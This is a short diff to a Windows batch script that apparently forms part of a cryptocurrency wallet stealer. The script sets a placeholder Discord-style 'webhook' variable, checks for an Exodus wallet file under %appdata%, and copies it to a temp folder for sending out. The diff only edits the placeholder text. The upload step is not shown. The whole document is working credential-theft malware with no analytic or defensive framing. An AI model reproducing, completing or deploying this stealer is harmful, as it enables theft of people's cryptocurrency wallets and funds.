@@ -1,5 +1,5 @@
 @echo off
-set webhook="put webhook here skid"
+set webhook="put webhook here"
 if exist %appdata%\Exodus\exodus.wallet (
     md %temp%\wallet
     copy %appdata%\Exodus\exodus.wallet %temp%\wallet >nul
